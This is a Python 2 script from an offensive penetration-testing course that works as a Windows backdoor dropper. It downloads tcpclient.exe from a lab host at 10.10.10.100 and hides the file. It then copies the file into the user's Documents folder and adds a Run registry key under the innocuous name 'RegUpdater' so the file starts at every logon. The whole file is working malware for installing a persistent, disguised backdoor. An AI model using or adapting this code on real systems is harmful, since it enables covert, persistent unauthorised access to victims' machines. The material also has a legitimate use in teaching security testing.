# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import os             # needed for getting working directory
import shutil         # needed for file copying
import subprocess     # needed for getting user profile
import _winreg as wreg # needed for editing registry DB

import requests 
import time
import urllib
from shutil import copyfile
# phase -1, download tcpclient.exe from the http and then:
current_dir = os.getcwd()
urllib.urlretrieve("http://10.10.10.100/tcpclient.exe", "tcpclient.exe")


#hidden tcpclient.exe file
subprocess.check_call(["attrib","+H","tcpclient.exe"])



# Reconn Phase

path = os.getcwd().strip('/n')  #Get current working directory where the backdoor gets executed, we use the output to build our source path

Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
#Get USERP ROFILE which contains the username of the profile and store it in userprof variable , we use the output to build our destination path
#Other way to discover the userprofile is via  os.getenv('userprofile') , both will give the same result 
destination = userprof.strip('\n\r') + '\\Documents\\'  +'tcpclient.exe'





# First and Second Phases


if not os.path.exists(destination):  # this if statement will be False next time we run the script becoz our tcpclient.exe will be already copied in destination                                   
                                     
    #First time our backdoor gets executed
    #Copy our Backdoor to C:\Users\<UserName>\Documents\
    #shutil.copyfile(path+'\tcpclient.exe', destination)
    shutil.copyfile(path+"\\tcpclient.exe", destination)


    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
                         wreg.KEY_ALL_ACCESS)
 
    destination2 = userprof.strip('\n\r') + '\\Documents\\'  +"tcpclient.exe"
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination2)
    #wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
    key.Close()
    #create a new registry string called RegUpdater pointing to our
    #new backdoor path (destination)

#If the script worked fine, out tcpclient.exe should be copied to C:\Users\<UserName>\Documents\ and a new registry key called 'RegUpdater' should be created
#and pointing to C:\Users\<UserName>\Documents\tcpclient.exe 
